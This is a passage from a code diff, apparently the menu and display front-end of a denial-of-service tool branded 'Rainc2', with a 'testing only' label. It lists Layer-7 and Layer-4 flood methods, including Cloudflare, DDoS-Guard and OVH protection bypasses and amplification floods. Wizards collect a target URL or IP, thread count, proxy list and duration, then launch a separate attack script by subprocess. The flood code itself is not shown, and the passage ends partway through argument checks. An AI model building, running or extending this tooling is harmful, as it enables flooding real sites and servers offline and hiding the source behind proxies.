+            if dur > 0 and el < dur:
+                time.sleep(step)
+            else:
+                break
+        # hold still: do not redraw, just wait hold_sec seconds
+        if hold_sec > 0:
+            time.sleep(hold_sec)
+    except KeyboardInterrupt:
+        pass                     # allow skipping the intro with Ctrl+C
+    finally:
+        sys.stdout.write("\x1b[2J\x1b[H" + show)
+        sys.stdout.flush()
+
+
+# ---------------------------------------------------------------------------
+# (old) digital character cascade -- fallback for art_rain on consoles without block chars
+# ---------------------------------------------------------------------------
+def matrix_rain(seconds=2.0, fps=32, cols=0, rows=0,
+                head_prob=0.005, near_prob=0.03, dim_prob=0.16,
+                head_code="\x1b[97;1m", near_code="\x1b[92m",
+                dim_code="\x1b[32m"):
+    """
+    Digital cascade (rain) effect where characters pour across the whole terminal.
+
+    Each vertical column flows down at its own speed,
+    the head character is bright and trailing characters fade progressively darker.
+    Does nothing if color is off or this is not a real terminal (console).
+    """
+    if not (_COLOR and sys.stdout and sys.stdout.isatty()):
+        return
+    if seconds <= 0:
+        return
+
+    import random as _rnd
+
+    if cols > 0 and rows > 0:
+        W, H = cols, rows
+    else:
+        W, H = _term_wh()
+        H = max(6, H - 1)          # reserve the bottom line
+
+    hp, np_, dp = head_prob, near_prob, dim_prob
+    n_chars = len(RAIN_CHARS)
+    rnd = _rnd.random
+
+    # per-column 'fallen position' and speed (speed changes often for a natural flow)
+    off = [rnd() * 5000.0 for _ in range(W)]
+    spd = [_rnd.uniform(0.5, 1.35) for _ in range(W)]
+
+    rst = C.RST
+    hide = "\x1b[?25l"
+    show = "\x1b[?25h"
+    step = 1.0 / max(1, fps)
+    next_tick = time.time()
+    deadline = next_tick + seconds
+
+    sys.stdout.write(hide)
+    try:
+        while True:
+            now = time.time()
+            if now >= deadline:
+                break
+
+            for c in range(W):
+                off[c] += spd[c]
+                if rnd() < 0.03:
+                    spd[c] = _rnd.uniform(0.5, 1.35)
+
+            frame = ["\x1b[H"]
+            for r in range(H):
+                row = []
+                for c in range(W):
+                    k = int(off[c]) - r        # position on the character tape (flows downward)
+                    # column/position-based deterministic noise -> stable moss (tail) without flicker
+                    v = c * 2246822519 + k * 3266489917
+                    v ^= v >> 15
+                    v &= 0x7fffffff
+                    frac = (v % 100000) * 1e-5
+                    if frac < hp:
+                        ch = RAIN_CHARS[(k + c * 5) % n_chars]
+                        row.append(head_code + ch + rst)
+                    elif frac < hp + np_:
+                        ch = RAIN_CHARS[(k * 3 + c * 7) % n_chars]
+                        row.append(near_code + ch + rst)
+                    elif frac < hp + np_ + dp:
+                        ch = RAIN_CHARS[(k * 7 + c * 11) % n_chars]
+                        row.append(dim_code + ch + rst)
+                    else:
+                        row.append(" ")
+                frame.append("".join(row))
+            # move the cursor to the top and overwrite a whole screen
+            sys.stdout.write("\n".join(frame) + "\x1b[0J")
+            sys.stdout.flush()
+
+            next_tick += step
+            delay = next_tick - time.time()
+            if delay > 0:
+                time.sleep(delay)
+    except KeyboardInterrupt:
+        pass                     # allow skipping the intro with Ctrl+C
+    finally:
+        sys.stdout.write("\x1b[2J\x1b[H" + show)
+        sys.stdout.flush()
+
+
+# ---------------------------------------------------------------------------
+# Main screen
+# ---------------------------------------------------------------------------
+# ---------------------------------------------------------------------------
+# Brain-style rendering helpers (news1 / news2 style)
+# ---------------------------------------------------------------------------
+_BOX_V = "|"
+_BOX_H = "-"
+_BOX_TL = "/"
+_BOX_TR = "\\"
+_BOX_BL = "\\"
+_BOX_BR = "/"
+
+# Red family from the ANSI 256-color palette (dark -> bright gradient look)
+def _red_grad(i, n):
+    """Return a dark red -> bright red 256-color code for i (0..n-1)."""
+    if n <= 1:
+        return "\x1b[38;5;160m"
+    steps = [88, 124, 160, 196, 202, 208, 214, 220]   # dark -> bright (red->orange)
+    t = i / (n - 1)
+    idx = t * (len(steps) - 1)
+    lo = int(idx)
+    hi = min(lo + 1, len(steps) - 1)
+    frac = idx - lo
+    base = steps[lo]
+    nxt = steps[hi]
+    # 256-color codes cannot be interpolated, so snap to the nearest
+    pick = steps[lo] if frac < 0.5 else steps[hi]
+    return f"\x1b[38;5;{pick}m"
+
+
+def brain_logo(art=BRAIN_ART):
+    """Print the 'BRAIN' logo with a left (dark) -> right (bright) red gradient."""
+    lines = art.rstrip("\n").split("\n")
+    W = max((len(l) for l in lines), default=0)
+    out = []
+    for ln in lines:
+        row = []
+        for c, ch in enumerate(ln):
+            if ch == " ":
+                row.append(" ")
+            else:
+                code = _red_grad(c, W)
+                if _COLOR:
+                    row.append(f"{code}{ch}{C.RST}")
+                else:
+                    row.append(ch)
+        out.append("".join(row))
+    return out
+
+
+def _plain(s):
+    """Compute display width after removing ANSI codes.
+
+    Widths match how the console actually renders the glyphs:
+      * East Asian Width W/F (CJK, ...)                 -> 2 cells
+      * astral-plane glyphs (ord > 0xFFFF), e.g. the math-script letters
+        (U+1D4E1 U+1D4EE ...) and emoji                    -> 2 cells
+      * everything else, including BMP box-drawing (║ ═ ╔) -> 1 cell
+    Counting the astral math letters as 1 cell made the boxes misalign and
+    pushed the right border (║) out of the frame.
+    """
+    import re as _re
+    import unicodedata as _ud
+    txt = _re.sub(r"\x1b\[[0-9;]*m", "", s)
+    w = 0
+    for ch in txt:
+        if ord(ch) > 0xFFFF or _ud.east_asian_width(ch) in ("W", "F"):
+            w += 2
+        else:
+            w += 1
+    return w
+
+
+# ---------------------------------------------------------------------------
+# Double-line box panel (╔═══╗ / ║ ║ / ╚═══╝) -- shared by main and all menus
+# ---------------------------------------------------------------------------
+_DBX_TL, _DBX_TR = "╔", "╗"
+_DBX_BL, _DBX_BR = "╚", "╝"
+_DBX_V, _DBX_H = "║", "═"
+
+
+def dbl_panel(inner_lines, indent=2, title=None, width=0, center=True,
+              text_center=False):
+    """Double-line (╔═╗) box panel. inner_lines is a list of already-painted strings.
+
+    If title is given it is engraved into the top border as '╔═ TITLE ═══╗'.
+    If width is given it guarantees a minimum inner width.
+    If text_center is True the content lines are centered inside the box
+    instead of left-aligned (main screen look).
+    Returns the completed list of line strings (the caller streams them with typewrite).
+    """
+    if isinstance(inner_lines, str):
+        inner_lines = [inner_lines]
+    inner_lines = list(inner_lines) if inner_lines else [""]
+    title_w = _plain(title) if title else 0
+    content_w = max([_plain(l) for l in inner_lines] + [title_w] + [14])
+    inner_w = max(content_w + 2, int(width) if width else 0, 20)
+    if center:
+        indent = max(0, (term_width() - (inner_w + 2)) // 2)
+    pad = " " * indent
+
+    if title:
+        seg = "═ " + title + " "
+        seg_w = _plain(seg)
+        top = pad + _DBX_TL + seg + _DBX_H * max(2, inner_w - seg_w) + _DBX_TR
+    else:
+        top = pad + _DBX_TL + _DBX_H * inner_w + _DBX_TR
+
+    rows = [top]
+    for ln in inner_lines:
+        if text_center:
+            # center the content line inside the box (main screen look)
+            gap = max(0, inner_w - _plain(ln))
+            left = gap // 2
+            rows.append(pad + _DBX_V + " " * left + ln + " " * (gap - left) + _DBX_V)
+        else:
+            fill = inner_w - _plain(ln) - 1
+            rows.append(pad + _DBX_V + " " + ln + " " * max(0, fill) + _DBX_V)
+    rows.append(pad + _DBX_BL + _DBX_H * inner_w + _DBX_BR)
+    return rows
+
+
+def draw_dbl_panel(inner_lines, indent=2, title=None, width=0, delay=0.04,
+                   center=True, text_center=False):
+    """Print the dbl_panel result directly as a top->down vertical flow."""
+    for ln in dbl_panel(inner_lines, indent=indent, title=title, width=width,
+                        center=center, text_center=text_center):
+        typewrite(ln, delay=delay)
+
+
+def box_panel(inner_lines, indent=2, title=None):
+    """(old) news1-style rounded box panel -- backward compatibility only. New code uses dbl_panel."""
+    if isinstance(inner_lines, str):
+        inner_lines = [inner_lines]
+    content_w = max([_plain(l) for l in inner_lines] + ([_plain(title) + 4] if title else [0]))
+    width = content_w + 2                 # 1 column of padding on each side
+    width = max(width, 22)
+    pad = " " * indent
+
+    if title:
+        # top border: /---- title ----\
+        seg = pad + _BOX_TL + _BOX_H * 2 + " " + title + " "
+        top = seg + _BOX_H * max(1, width - (_plain(seg) - indent - len(pad) + 2)) + _BOX_TR
+    else:
+        top = pad + _BOX_TL + _BOX_H * max(2, width - 2) + _BOX_TR
+
+    body = []
+    if title:
+        body.append(top)
+    else:
+        body.append(top)
+    for ln in inner_lines:
+        pad_len = width - _plain(ln)
+        body.append(pad + _BOX_V + " " + ln + " " * max(0, pad_len - 2) + _BOX_V)
+    bottom = pad + _BOX_BL + _BOX_H * max(2, width - 2) + _BOX_BR
+    body.append(bottom)
+    return body
+
+
+def dotted_panel(title_lines, rows, indent=2, title_color=C.CY):
+    """news2 style: a title row + dotted leader rows.
+
+    title_lines : banner strings (Attack Details |  /  Target Details |)
+    rows        : list of (label, value_label, value)  -- value_label=(color)
+    """
+    if isinstance(title_lines, str):
+        title_lines = [title_lines]
+    max_lab = max([_plain(l) for l in title_lines] + [len(r[0]) for r in rows], default=10)
+    total_w = max_lab + 26
+    pad = " " * indent
+
+    out = []
+    # title row
+    for tl in title_lines:
+        out.append(pad + paint(tl, title_color, bold=True))
+    out.append("")
+
+    for label, vcolor, value in rows:
+        lead = max_lab - len(label) + 2
+        leader = "." * max(6, lead)
+        line = ("· " + paint(label, C.W) + " " +
+                paint(leader, C.DIM) + "  " +
+                paint(f"[ {value} ]", vcolor, bold=True))
+        out.append(pad + line)
+    return out
+
+
+def show_main_screen(intro=None):
+    """Main art banner + title.
+
+    intro=None : automatic ('drop then hold 1s' on first entry, a short drop on return)
+    intro=number : set the total effect (drop + hold) time to that many seconds
+    intro=0    : banner only, no effect
+    """
+    global _RAIN_PLAYED
+
+    if intro is None:
+        if not _RAIN_PLAYED:
+            drop_sec, hold_sec = RAIN_DROP_SEC, RAIN_HOLD_SEC
+            _RAIN_PLAYED = True
+        else:
+            drop_sec, hold_sec = RAIN_REPEAT_DROP_SEC, RAIN_REPEAT_HOLD_SEC
+    elif not intro:
+        drop_sec = hold_sec = 0.0
+    else:
+        # numeric value: interpreted as the total effect (drop + hold) time
+        total = max(0.0, float(intro))
+        drop_sec = min(RAIN_DROP_SEC, max(0.2, total * 0.4))
+        hold_sec = max(0.0, total - drop_sec)
+
+    # 0) wipe the previous screen completely (including the scrollback buffer)
+    #    BEFORE the rain effect, so old output (e.g. a /help listing) is gone
+    #    the moment we return to the main screen.
+    clear_screen()
+
+    # 1) the logo pours down once from the top, stops, then switches to main
+    if drop_sec > 0:
+        art_drop(drop_sec, hold_sec)
+
+    # 2) render the RAIN art + 2 double-line boxes (top->down vertical flow)
+    #    (art_drop already clears the viewport after the effect)
+    print("")
+
+    # top: the RAIN box letter art flows from top to bottom
+    for ln in banner_rainbow(MAIN_ART):
+        typewrite(ln, delay=0.04)
+    time.sleep(0.08)
+
+    # box 1 (taller box): welcome message + command hint
+    # drawn via dbl_panel() so the labels above the boxes can be aligned to them
+    welcome_lines = [
+        paint("Welcome to 𝓡𝓪𝓲𝓷𝓬2 made by 𝓢𝓮𝓸𝓳𝓾", C.W, bold=True),
+        "",
+        paint("Type HELP for a list of All C2 Commands.", C.Y, bold=True),
+    ]
+    # width reduced 20% (was 64)
+    box1_rows = dbl_panel(welcome_lines, indent=2, width=51, text_center=True)
+
+    # box 2 (wider but shorter box): copyright notice only
+    # width reduced 20% (was 88) and the previous version/method content removed
+    copyright_lines = [
+        paint("Copyright © 2026 RAIN, All Rights Reserved!", C.CY, bold=True),
+    ]
+    box2_rows = dbl_panel(copyright_lines, indent=2, width=70, text_center=True)
+
+    def _label_over(rows, label):
+        """Center a decorative label horizontally over the box built from rows."""
+        top = rows[0]
+        indent = len(top) - len(top.lstrip())
+        inner_w = len(top.lstrip()) - 2
+        return " " * (indent + max(0, (inner_w - _plain(label)) // 2)) + label
+
+    # decorative label attached directly on top of box 1 (no blank line between)
+    typewrite(_label_over(box1_rows, paint("★ 𝓸𝓷𝓵𝔂 𝓯𝓸𝓻 𝓽𝓮𝓼𝓽𝓲𝓷𝓰  ★", C.Y, bold=True)), delay=0.04)
+    for ln in box1_rows:
+        typewrite(ln, delay=0.04)
+
+    # decorative label attached directly on top of box 2 (no blank line between)
+    typewrite(_label_over(box2_rows, paint("☾⁺₊ 𝓳𝓸𝓲𝓷 𝓭𝓲𝓼𝓬𝓸𝓻𝓭.𝓰𝓰/𝓪56𝓣𝓔𝓙6𝓳  ☾⁺₊", C.M, bold=True)), delay=0.04)
+    for ln in box2_rows:
+        typewrite(ln, delay=0.04)
+    print("")
+
+
+def open_screen(art, header, sub=None):
+    """Option entry screen: clears the screen and presents dedicated art + a double-line box header."""
+    clear_screen()
+    print("")
+    for ln in banner_rainbow(art):
+        typewrite(ln, delay=0.04)
+    time.sleep(0.08)
+    print("")
+    head_lines = [paint(header, C.W, bold=True)]
+    if sub:
+        head_lines.append(paint(sub, C.CY))
+    draw_dbl_panel(head_lines, indent=2, title=header.split()[0] if header else None,
+                   width=64)
+    print("")
+
+# ---------------------------------------------------------------------------
+# Attack start effect
+# ---------------------------------------------------------------------------
+_LAYER7_LABEL = {
+    "GET": "HTTP GET FLOOD", "POST": "HTTP POST FLOOD",
+    "HEAD": "HTTP HEAD FLOOD", "NULL": "NULL USER-AGENT FLOOD",
+    "COOKIE": "COOKIE STORM", "OVH": "OVH BYPASS",
+    "CFB": "CLOUDFLARE BYPASS", "CFBUAM": "CLOUDFLARE UAM BYPASS",
+    "BYPASS": "BYPASS", "DGB": "DDoS-GUARD BYPASS",
+    "AVB": "AV BYPASS", "GSB": "GSE BYPASS",
+    "PPS": "PPS FLOOD", "EVEN": "EVEN FLOOD",
+    "STRESS": "STRESS FLOOD", "DYN": "RANDOM SUBDOMAIN FLOOD",
+    "SLOW": "SLOWLORIS", "APACHE": "APACHE FLOOD",
+    "XMLRPC": "XML-RPC FLOOD", "BOT": "BOT FLOOD",
+    "BOMB": "BOMBARDIER", "DOWNLOADER": "SLOW DOWNLOADER",
+    "KILLER": "KILLER FLOOD", "TOR": "TOR FLOOD",
+    "RHEX": "RANDOM HEX FLOOD", "STOMP": "STOMP / CAPTCHA BYPASS",
+}
+
+
+def _layer_label(method):
+    return _LAYER7_LABEL.get(method.upper(), method)
+
+
+def show_attack_start(method, target, address, port, threads, duration,
+                      is_layer7=True, proxy_count=0):
+    """
+    Streams a 'weapon loading + target info' effect paragraph by paragraph right before the attack launches.
+    """
+    layer = "LAYER-7 / HTTP FLOOD" if is_layer7 else "LAYER-4 / NETWORK FLOOD"
+    method_disp = method.upper()
+
+    # paragraph 1: clear the screen and present the large ATTACK art
+    clear_screen()
+    print("")
+    for ln in banner_rainbow(ATTACK_ART, color_cycle=[C.R, C.Y, C.R, C.W]):
+        typewrite(ln, delay=0.04)
+    time.sleep(0.1)
+
+    # paragraph 2: stream the target / settings summary in a double-line box
+    draw_dbl_panel([
+        paint(f"HOST     : {target}", C.W),
+        paint(f"ADDRESS  : {address}", C.W),
+        paint(f"PORT     : {port or 80}", C.W),
+    ], indent=2, title="TARGET-SYSTEM")
+    print("")
+    draw_dbl_panel([
+        paint(f"METHOD   : {method_disp:<10} ({layer})", C.Y),
+        paint(f"THREADS  : {threads:,}", C.Y),
+        paint(f"DURATION : {duration} SEC", C.Y),
+        paint(f"PROXY    : {proxy_count:,} ACTIVE" if proxy_count else
+              f"PROXY    : NONE (DIRECT)", C.Y),
+    ], indent=2, title="ATTACK-PROFILE")
+    print("")
+
+    # paragraph 3: loading/launch effect
+    steps = [
+        "[>] ARMING PACKET ENGINE ............ " + paint("OK", C.G, bold=True),
+        "[>] LOADING PAYLOAD MAGAZINES ....... " + paint("OK", C.G, bold=True),
+        "[>] WARMING UP CONNECTION POOL ...... " + paint("OK", C.G, bold=True),
+        f"[>] SPINNING UP THREAD ARMY ........ {threads:,} UNITS " + paint("DEPLOYED", C.G, bold=True),
+        "[>] SYNCHRONIZING FIRE CONTROL ...... " + paint("LOCKED", C.G, bold=True),
+    ]
+    for st in steps:
+        typewrite(paint("  ", C.R) + st, delay=0.04)
+    time.sleep(0.1)
+
+    print(paint("  ********  ALL ENGINES ENGAGED  --  UNLEASH THE STORM  ********", C.R, bold=True))
+    print("", flush=True)
+    time.sleep(0.2)
+
+
+# ---------------------------------------------------------------------------
+# Real-time status bar
+# ---------------------------------------------------------------------------
+_SPIN = ("-", "\\", "|", "/")
+
+
+def _human_unit(num, suffix):
+    for unit in ("", "K", "M", "G", "T", "P"):
+        if num < 1000:
+            return f"{num:.1f} {unit}{suffix}"
+        num /= 1000.0
+    return f"{num:.1f} E{suffix}"
+
+
+def human_bps(num):
+    """Simplify the BPS display."""
+    return _human_unit(num, "B/s").replace(" B/s", " B/s")
+
+
+def human_size(num):
+    """Byte total display."""
+    return _human_unit(num, "B").replace("B/s", "B") if False else \
+        _human_unit(num, "B").replace(" B", " B")
+
+
+def human_bytes(num):
+    """Transferred total display (B/KB/MB/GB)."""
+    return _human_unit(num, "B").replace("KB", "KB")
+
+
+def human_pps(num):
+    """Simplify the PPS display."""
+    for unit in ("", "k", "M", "G"):
+        if num < 1000:
+            return f"{num:.1f}{unit}"
+        num /= 1000.0
+    return f"{num:.1f}T"
+
+
+def _wide_ok():
+    """Check whether the █ ░ block characters can be used with the current stdout encoding."""
+    try:
+        enc = getattr(sys.stdout, "encoding", None) or "utf-8"
+        "\u2588\u2591".encode(enc)
+        return True
+    except Exception:
+        return False
+
+
+def render_status(step, total_steps, method, target, pps, bps, threads,
+                  elapsed, duration):
+    """Single-line progress bar refreshed every second."""
+    pct = min(100.0, max(0.0, elapsed / max(duration, 1) * 100.0))
+    bar_w = 18
+    filled = int(round(pct / 100.0 * bar_w))
+    if _wide_ok():
+        bar = "\u2588" * filled + "\u2591" * (bar_w - filled)   # █ ░
+    else:
+        bar = "#" * filled + "-" * (bar_w - filled)             # ASCII fallback
+
+    spin = _SPIN[step % len(_SPIN)]
+    info = (f"{paint('[' + spin + ']', C.M)}"
+            f"{paint(' ' + method.upper(), C.CY, bold=True)}"
+            f"{paint(' ' + target[:40], C.W)}"
+            f"{paint('  [' + bar + ']', C.G)}"
+            f"{paint(f' {pct:5.1f}%', C.Y)}"
+            f"{paint(f' PPS {human_pps(pps):>8}', C.CY)}"
+            f"{paint(f' BPS {human_bps(bps):>10}', C.M)}"
+            f"{paint(f' {elapsed:>4}s/{duration}s', C.W)}"
+            f"{paint(f' T:{threads}', C.DIM)}")
+
+    width = min(term_width() - 1, 100)
+    pad = max(0, width - _plain_len(info))
+    try:
+        print("\r" + info + " " * pad, end="", flush=True)
+    except UnicodeEncodeError:
+        plain = (f"\r[{spin}] {method.upper()} {target[:30]} "
+                 f"[{bar}] {pct:5.1f}% PPS {pps} BPS {bps} "
+                 f"{elapsed}s/{duration}s T:{threads}")
+        print(plain + " " * max(0, width - len(plain)), end="", flush=True)
+
+
+def _plain_len(styled):
+    """Display width after removing ANSI codes (same accounting as _plain)."""
+    return _plain(styled)
+
+
+# ---------------------------------------------------------------------------
+# Attack finish effect
+# ---------------------------------------------------------------------------
+def show_attack_end(total_requests, total_bytes):
+    """After finishing, clear the screen and present the large FINISH art + stats summary."""
+    clear_screen()
+    print("")
+    for ln in banner_rainbow(FINISH_ART, color_cycle=[C.G, C.CY, C.G, C.W]):
+        typewrite(ln, delay=0.04)
+    time.sleep(0.1)
+    print(paint("  ********  ALL ENGINES HALTED  --  ATTACK MISSION COMPLETE  ********", C.G, bold=True))
+    print("")
+
+    draw_dbl_panel([
+        paint("FIRE CONTROL         : ALL ENGINES HALTED", C.G),
+        paint(f"TOTAL PACKETS SENT   : {total_requests:,}", C.G),
+        paint(f"TOTAL BYTES DEPLOYED : {human_bytes(total_bytes) if total_bytes else '0 B'}", C.G),
+        paint("MISSION STATUS       : COMPLETE", C.G),
+    ], indent=2, title="MISSION SUMMARY")
+    print("", flush=True)
+
+
+# ---------------------------------------------------------------------------
+# Interactive main menu
+# ---------------------------------------------------------------------------
+def _ask(prompt_text, default=None):
+    """If a default exists, Enter keeps it."""
+    if default is not None:
+        prompt_text = f"{prompt_text} [{default}] "
+    try:
+        val = input(prompt_text).strip()
+    except (EOFError, KeyboardInterrupt):
+        print("")
+        raise SystemExit(0)
+    return val if val else (default if default is not None else "")
+
+
+def _ask_int(prompt_text, default, minimum=1, maximum=None):
+    """Integer input validation prompt. Asks again on an invalid value.
+    Returns None on MENU / BACK / Q / EXIT so the caller can treat it as a cancel."""
+    if default is not None:
+        prompt_text = f"{prompt_text} [{default}] "
+    while True:
+        try:
+            raw = input(prompt_text).strip()
+        except (EOFError, KeyboardInterrupt):
+            print("")
+            raise SystemExit(0)
+        if not raw:
+            raw = default
+        up = raw.upper()
+        if up in {"MENU", "BACK", "Q", "EXIT", "CANCEL", "X"}:
+            return None
+        try:
+            val = int(up)
+        except ValueError:
+            print(paint(f"[!] Enter digits only. (e.g. {default})", C.R))
+            continue
+        if val < minimum:
+            print(paint(f"[!] Must be at least {minimum}.", C.R))
+            continue
+        if maximum is not None and val > maximum:
+            print(paint(f"[!] Must be at most {maximum}.", C.R))
+            continue
+        return val
+
+
+def _ask_required(prompt_text, err_msg):
+    """If the value is empty, print err_msg and ask the same question again.
+    Returns None on MENU / BACK / Q / EXIT so the caller can treat it as a cancel."""
+    while True:
+        try:
+            val = input(prompt_text).strip()
+        except (EOFError, KeyboardInterrupt):
+            print("")
+            raise SystemExit(0)
+        if not val:
+            print(paint(f"[!] {err_msg}", C.R))
+            continue
+        if val.upper() in {"MENU", "BACK", "Q", "EXIT", "CANCEL", "X"}:
+            return None
+        return val
+
+
+def _run_attack(script, argv_args):
+    """Run start.py as a subprocess (without showing the main screen again)."""
+    print("")
+    typewrite(paint("[i] EXECUTING ATTACK MODULE .........", C.CY), delay=0.04)
+    typewrite(paint("OK", C.G, bold=True), delay=0.04)
+    print("", flush=True)
+    try:
+        subprocess.run([sys.executable, script] + argv_args, check=False)
+    except KeyboardInterrupt:
+        print("")
+        typewrite(paint("[!] ATTACK INTERRUPTED BY OPERATOR", C.Y), delay=0.04)
+    except Exception as exc:
+        print(paint(f"[!] LAUNCH FAILED : {exc}", C.R, bold=True))
+
+
+# ---------------------------------------------------------------------------
+# METHODS color grid (shared by wizard / EXPERT / full list)
+# ---------------------------------------------------------------------------
+_METHOD_PALETTE = [C.CY, C.G, C.Y, C.M, C.B, C.R, C.W]
+
+
+def _method_color(idx):
+    """Return a different character color per index in the METHODS grid."""
+    return _METHOD_PALETTE[idx % len(_METHOD_PALETTE)]
+
+
+def show_method_panel(title, methods, numbered=False, indent="  "):
+    """Print the whole METHODS list as a column grid with character colors.
+
+    With numbered=True it prefixes 1..N numbers (for wizard selection).
+    The color alone, even without the name, distinguishes which method is which.
+    """
+    mlist = sorted({str(m).upper() for m in methods})
+    if not mlist:
+        return
+    # normalize indent so it accepts either a string ("  ") or an int (2)
+    n_ind = indent if isinstance(indent, int) else len(indent)
+    digits = len(str(len(mlist)))
+    name_w = max(len(m) for m in mlist)
+    cell_w = (digits + 2 if numbered else 0) + name_w + 2
+    avail = max(40, term_width() - n_ind)
+    cols = max(1, min(6, avail // max(cell_w, 12)))
+    rows = [mlist[i:i + cols] for i in range(0, len(mlist), cols)]
+    grid = []
+    for r_i, row in enumerate(rows):
+        cells = []
+        for c_j, m in enumerate(row):
+            gi = r_i * cols + c_j
+            name = paint(m.ljust(name_w), _method_color(gi), bold=True)
+            if numbered:
+                cells.append(paint(f"{gi + 1:>{digits}}: ", C.DIM) + name)
+            else:
+                cells.append(name)
+        grid.append(("   ".join(cells)).rstrip())
+    draw_dbl_panel(grid, indent=n_ind,
+                   title=f"{title}  ({len(mlist)} METHODS)")
+    print("")
+
+
+_CANCEL_WORDS = {"MENU", "BACK", "Q", "EXIT", "CANCEL", "X", "QUIT"}
+
+
+def _pick_method(layer_title, methods, default_method):
+    """On the layer wizard's first screen, show the whole METHODS list with colors/numbers and pick one.
+
+    Selectable by method name (GET, POST ...) or list number (1, 2, 3 ...).
+    Returns None on cancel input such as MENU / BACK / Q.
+    """
+    methods = sorted(methods)
+    show_method_panel(layer_title + "  --  ALL METHODS", methods, numbered=True)
+    while True:
+        raw = (_ask("SELECT METHOD (name or number)", default_method)
+               .strip().upper() or default_method)
+        if raw in _CANCEL_WORDS:
+            return None
+        if raw.isdigit():
+            idx = int(raw)
+            if 1 <= idx <= len(methods):
+                return methods[idx - 1]
+            print(paint(f"[!] Enter a number between 1 and {len(methods)}.", C.R))
+            continue
+        if raw in methods:
+            return raw
+        print(paint(f"[!] Unknown method: {raw}  (enter a name or number from the list above)", C.R))
+
+
+def wizard_layer7(script, methods):
+    open_screen(LAYER7_ART, "LAYER-7  WEB FLOOD  (web attack wizard)",
+                "GET / POST / OVH / CFB / DYN / SLOW / RHEX ... attack setup")
+    methods = sorted(methods)
+    default_method = "GET" if "GET" in methods else methods[0]
+    # show all METHODS with colors/numbers from the start and select by name or number
+    method = _pick_method("LAYER-7 (WEB)", methods, default_method)
+    if method is None:
+        return
+
+    url = _ask_required("TARGET URL  (e.g. https://example.com)", "A target URL is required.")
+    if url is None:
+        return
+    if not url.lower().startswith("http"):
+        url = "http://" + url
+
+    while True:
+        socks = _ask("SOCKS TYPE  0=ALL 1=HTTP 4=SOCKS4 5=SOCKS5 (default 1)", "1").strip()
+        if not socks:
+            socks = "1"
+        if socks.upper() in {"MENU", "BACK", "Q", "EXIT", "CANCEL", "X"}:
+            return
+        if socks in {"0", "1", "4", "5", "6"}:
+            break
+        print(paint("[!] Enter only one of 0, 1, 4, 5, 6 for SOCKS TYPE.", C.R))
+
+    threads = _ask_int("THREADS  (thread count, default 300)", "300", minimum=1)
+    if threads is None:
+        return
+    rpc = _ask_int("RPC  (requests per connection, default 1)", "1", minimum=1)
+    if rpc is None:
+        return
+    proxylist = _ask("PROXY LIST  (file name, default http.txt)", "http.txt").strip()
+    if not proxylist:
+        proxylist = "http.txt"
+    if proxylist.upper() in {"MENU", "BACK", "Q", "EXIT", "CANCEL", "X"}:
+        return
+    if "/" not in proxylist and not proxylist.lower().endswith(".txt"):
+        proxylist += ".txt"
+    duration = _ask_int("DURATION  (attack seconds, default 60)", "60", minimum=1)
+    if duration is None:
+        return
+
+    print("")
+    draw_dbl_panel([
+        paint(f"METHOD    : {method}", C.W),
+        paint(f"TARGET    : {url}", C.W),
+        paint(f"SOCKS     : {socks}    THREADS : {threads}", C.W),
+        paint(f"RPC       : {rpc}    PROXY   : {proxylist}", C.W),
+        paint(f"DURATION  : {duration} sec", C.W),
+    ], indent=2, title="CONFIRM ATTACK SETTINGS")
+    print("")
+    go = _ask("Press ENTER to start the attack, type C to cancel", "").upper()
+    if go in {"C", "CANCEL", "X", "NO"}:
+        return
+    _run_attack(script, [method, url, socks, str(threads), proxylist, str(rpc), str(duration)])
+
+
+def wizard_layer4(script, methods):
+    open_screen(LAYER4_ART, "LAYER-4  NETWORK FLOOD  (server attack wizard)",
+                "TCP / UDP / SYN / ICMP / NTP / DNS / MEM / RDP attack setup")
+    methods = sorted(methods)
+    default_method = "TCP" if "TCP" in methods else methods[0]
+    # show all METHODS with colors/numbers from the start and select by name or number
+    method = _pick_method("LAYER-4 (NETWORK)", methods, default_method)
+    if method is None:
+        return
+
+    target = _ask_required("TARGET IP:PORT  (e.g. 1.2.3.4:80)", "A target IP:PORT is required.")
+    if target is None:
+        return
+    if ":" not in target:
+        target += ":80"
+    threads = _ask_int("THREADS  (default 500)", "500", minimum=1)
+    if threads is None:
+        return
+    duration = _ask_int("DURATION  (sec, default 60)", "60", minimum=1)
+    if duration is None:
+        return
+
+    print("")
+    draw_dbl_panel([
+        paint(f"METHOD    : {method}", C.W),
+        paint(f"TARGET    : {target}", C.W),
+        paint(f"THREADS   : {threads}", C.W),
+        paint(f"DURATION  : {duration} sec", C.W),
+    ], indent=2, title="CONFIRM ATTACK SETTINGS")
+    print("")
+    go = _ask("Press ENTER to start the attack, type C to cancel", "").upper()
+    if go in {"C", "CANCEL", "X", "NO"}:
+        return
+    _run_attack(script, [method, target, str(threads), str(duration)])
+
+
+def expert_cmd(script, l7, l4):
+    open_screen(EXPERT_ART, "EXPERT  (direct command execution)",
+                "Advanced console to enter L7 / L4 arguments directly on one line")
+    # show the available METHODS first as a color grid
+    show_method_panel("LAYER-7 (WEB) METHODS", sorted(l7))
+    show_method_panel("LAYER-4 (NETWORK) METHODS", sorted(l4))
+    print("")
+    draw_dbl_panel([
+        paint("L7", C.CY, bold=True) + " :  " + paint("METHOD", C.Y, bold=True) +
+        " URL SOCKS THREADS PROXYLIST RPC DURATION",
+        "     e.g. " + paint("GET", C.G, bold=True) +
+        " https://example.com 1 300 http.txt 1 60",
+        "",
+        paint("L4", C.CY, bold=True) + " :  " + paint("METHOD", C.Y, bold=True) +
+        " IP:PORT THREADS DURATION",
+        "     e.g. " + paint("UDP", C.G, bold=True) + " 1.2.3.4:53 200 60",
+        "",
+        "Type BACK / MENU to return",
+    ], indent=2, title="COMMAND FORMAT")
+    print("")
+    line = _ask("\U0001d4e1\U0001d4b6\U0001d4be\U0001d4c3# ")
+    if not line or line.upper() in {"BACK", "MENU", "EXIT", "Q"}:
+        return
+    parts = line.split()
+    if not parts:
+        return
+    method = parts[0].upper()
+    if method in l7:
+        need = 7
+    elif method in l4:
+        need = 3
+    else:
+        print(paint(f"[!] Unknown method: {method}", C.R))
+        return
+    if len(parts) < need:
+        print(paint(f"[!] Not enough arguments. (needed: {need}, given: {len(parts)})", C.R))
+        return
+    if method in l7 and not parts[1].lower().startswith("http"):
+        parts[1] = "http://" + parts[1]
+    if method in l4 and ":" not in parts[1]:
+        parts[1] += ":80"
+    # validate numeric arguments up front since passing bad ones makes the child process error
+    try:
+        if method in l7:
+            socks_t = parts[2]
+            if socks_t not in {"0", "1", "4", "5", "6"}:
+                raise ValueError("SOCKS TYPE must be one of 0,1,4,5,6")
